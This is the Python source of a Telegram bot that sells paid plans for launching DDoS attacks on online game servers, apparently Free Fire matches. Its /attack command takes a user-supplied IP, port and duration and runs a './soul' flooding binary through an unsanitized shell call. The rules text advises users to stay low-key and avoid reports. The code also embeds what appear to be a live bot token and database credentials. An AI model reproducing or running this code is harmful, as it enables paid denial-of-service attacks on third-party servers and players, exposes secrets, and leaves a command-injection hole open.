import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7987563641:AAEkQcErl3bFlpSy8ozDq7DcrZgp3SpF7yE'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002156421934
CHANNEL_ID = -1002156421934
error_channel_id = -1002156421934

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "El proxy ha sido actualizado correctamente.")
    except Exception as e:
        bot.send_message(chat_id, f"Error al actualizar el proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*üö´ Acceso Denegado!*\n"
                                   "*No tienes permiso para ejecutar este comando.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*‚ö†Ô∏è ¬°Espera! Formato de comando no v√°lido.*\n"
                                   "*Please use one of the following commands:*\n"
                                   "*1. /approve <user_id> <plan> <days>*\n"
                                   "*2. /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan üß°
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*üö´ Error de aprobaci√≥n: l√≠mite del Plan instant√°neo üß° alcanzado (99 usuarios).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan üí•
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*üö´ Error de aprobaci√≥n: se alcanz√≥ el l√≠mite del Plan Instant++ üí• (499 usuarios).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*üéâ Congratulations!*\n"
                    f"*Usuario {target_user_id} ha sido aprobado!*\n"
                    f"*Plan: {plan} por {days} dias!*\n"
                    f"*Welcome to our community! Let‚Äôs make some magic happen! ‚ú®*")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*‚ùå Aviso de desaprobaci√≥n!*\n"
                    f"*Usuarior {target_user_id} ha sido desaprobado.*\n"
                    f"*Ellos han sido revertidos al plan gratuito.*\n"
                    f"*¬°An√≠melos a intentarlo de nuevo pronto! üçÄ*")

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')



# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*üö´ Acceso Denegado!*\n"  # Access Denied message
                                       "*Necesitas ser aprobado para poder utilizar este bot.*\n"  # Need approval message
                                       "*Contacta al due√±o: @xFernandoh.*", parse_mode='Markdown')  # Contact owner message
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*üß° Instant Plan esta completamente lleno!* \n"  # Instant Plan full message
                                       "*Considera comprar un plan VIP para que tengas mayor prioridad.*", parse_mode='Markdown')  # Upgrade message
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*üí• Instant++ Plan esta completamente lleno!* \n"  # Instant++ Plan full message
                                       "*Considera comprar un plan o sigue esperando.*", parse_mode='Markdown')  # Upgrade message
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*‚ö†Ô∏è Por favor espera!*\n"  # Busy message
                                       "*El bot est√° ocupado con otro ataque..*\n"  # Current attack message
                                       "*Verifique el tiempo restante con el comando /when.*", parse_mode='Markdown')  # Check remaining time
            return

        bot.send_message(chat_id, "*üí£ Preparado para subir el ping?*\n"  # Ready to launch message
                                   "*Proporcione la IP de la partida, y la duraci√≥n en segundos.*\n"  # Provide details message
                                   "*Ejemplo 148.153.168.181:10015* üî•\n"  # Example message
                                   "*Que comience el caos! üéâ*", parse_mode='Markdown')  # Start chaos message
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*‚ùó Error!*\n"  # Error message
                                               "*Por favor usa el tipo de comando correcto y intenta de nuevo.*\n"  # Correct format message
                                               "*Asegurate de proporcionar bien la IP! üîÑ*", parse_mode='Markdown')  # Three inputs message
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*üîí Puerto {target_port} esta bloqueado.*\n"  # Blocked port message
                                               "*Por favor selecciona otro puerto para poder seguir.*", parse_mode='Markdown')  # Different port message
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*‚è≥ Duraci√≥n m√°xima en segundos es 599.*\n"  # Duration limit message
                                               "*Por favor pon una duraci√≥n mas corta e int√©ntalo de nuevo!*", parse_mode='Markdown')  # Shorten duration message
            return  

        bot.attack_in_progress = True  # Mark that an attack is in progress
        bot.attack_duration = duration  # Store the duration of the ongoing attack
        bot.attack_start_time = time.time()  # Record the start time

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*üöÄ Attack Launched! üöÄ*\n\n"  # Attack launched message
                                           f"*üì° Host Afectado: {target_ip}*\n"  # Target host message
                                           f"*üëâ Puerto Afectado: {target_port}*\n"  # Target port message
                                           f"*‚è∞ Duraci√≥n: {duration} segundos! Que comience la diversi√≥n! üî•*", parse_mode='Markdown')  # Duration message

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")





def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*‚è≥ Tiempo Restante: {int(remaining_time)} segundos...*\n"
                                       "*üîç ¬°Ag√°rrate fuerte, la acci√≥n a√∫n se est√° desarrollando!*\n"
                                       "*üí™ Mantente actualizado sobre las siguientes actualizaciones!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*üéâ El ataque ha sido exitoso!*\n"
                                       "*üöÄ You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*‚ùå Actualmente no hay ning√∫n ataque en curso.*\n"
                                   "*üîÑ ¬°Si√©ntete libre de iniciar tu ataque cuando est√©s listo!*", parse_mode='Markdown')


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if not user_data:
        # User not found in the database
        response = "*‚ùå Oops! No he encontrado ning√∫na cuenta!* \n"  # Account not found message
        response += "*Para asistencia contacte a: @xFernandoh* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*üîí Tu cuenta esta esperando a se aprovada!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @xFernandoh* üôè"  # Contact owner message
    else:
        # User found and approved
        username = message.from_user.username or "Unknown User"  # Default username if none provided
        plan = user_data.get('plan', 'N/A')  # Get user plan
        valid_until = user_data.get('valid_until', 'N/A')  # Get validity date
        current_time = datetime.now().isoformat()  # Get current time
        response = (f"*üë§ USERNAME: @{username}* \n"  # Username
                    f"*üí∏ PLAN: {plan}* \n"  # User plan
                    f"*‚è≥ VALIDO HASTA: {valid_until}* \n"  # Validity date
                    f"*‚è∞ HORA ACTUAL: {current_time}* \n"  # Current time
                    f"*üåü¬°Gracias por ser una parte importante de nuestra comunidad! Si tienes alguna pregunta o necesitas ayuda, ¬°solo pregunta! ¬°Estamos aqu√≠ para ayudarte!* üí¨ü§ù")  # Community message

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*üìú Reglas del Bot - Sientete Insano!\n\n"
        "1. No spammear ataques! ‚õî \nRest for 5-6 matches between DDOS.\n\n"
        "2. No mates mucha gente! üî´ \nMantente entre 6-10 kills para que sea equitativo.\n\n"
        "3. Jugar inteligentemente! üéÆ \nAvoid reports and stay low-key.\n\n"
        "4. No usar archivos! üö´ \nSi usas archivos en Free Fire puedes ser baneado.\n\n"
        "5. Be respectful! ü§ù \nKeep communication friendly and fun.\n\n"
        "6. Reporta Bugs! üõ°Ô∏è \nMessage Al due√±o por cualquier inconveniente.\n\n"
        "üí° Sigue las reglas y tendr√°s muy buena diversi√≥n!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")

    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*üåü Bienvenido al centro de comandos!*\n\n"
                 "*Esto es lo que puedes hacer:* \n"
                 "1. *`/attack` - ‚öîÔ∏è Lanzar un ataque a tu partida!*\n"
                 "2. *`/myinfo` - üë§ La informaci√≥n de tu cuenta para que sigas informado.*\n"
                 "3. *`/owner` - üìû Contacta e√±al due√±o del puto bot alaverga!*\n"
                 "4. *`/when` - ‚è≥ Quieres saber el status del bot? Descubrelo ahora!*\n"
                 "5. *`/canary` - ü¶Ö Obtenga la √∫ltima versi√≥n de Canary para disfrutar de funciones de vanguardia.*\n"
                 "6. *`/rules` - üìù Las reglas para que tenga un juego limpio y justo.*\n\n"
                 "*üí°  ¬øTienes preguntas? ¬°No dudes en preguntar! ¬°Su satisfacci√≥n es nuestra prioridad!*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /help command: {e}")



@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*üë§ **Informaci√≥n del due√±o:**\n\n"
        "Para cualquier consulta, soporte u oportunidad de colaboraci√≥n, no dude en comunicarse con el propietario:\n\n"
        "üì© **Telegram:** @xFernandoh\n\n"
        "üí¨ **Valoramos tus comentarios!** Sus pensamientos y sugerencias son cruciales para mejorar nuestro servicio y mejorar tu experiencia.\n\n"
        "üåü **Gracias por ser parte de nuestra comunidad** ¬°Tu apoyo significa mucho para nosotros y siempre estamos aqu√≠ para ayudar!*\n"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*üåç Bienvenido al mundo del DDoS!* üéâ\n\n"
                                           "*üöÄ Estas listo para la acci√≥n!*\n\n"
                                           "*üí£ Para desatar el poder, usa el comando* `/attack` *Seguido por la IP y puertos que deseas afectar.* ‚öîÔ∏è\n\n"
                                           "*üîç Ejemplo: Pones* `/attack`, *enter:* `IP puerto y duraci√≥n en segundos`.\n\n"
                                           "*üî• Ensure your target is locked in before you strike!*\n\n"
                                           "*üìö Eres nuevo aqu√≠? Usa el comando* `/help` *para descubrir todo lo que puedes hacer.* üìú\n\n"
                                           "*‚ö†Ô∏è Recuerde, ¬°un gran poder conlleva una gran responsabilidad! √ösalo sabiamente... ¬°o deja que reine el caos!* üòàüí•", 
                                           parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /start command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
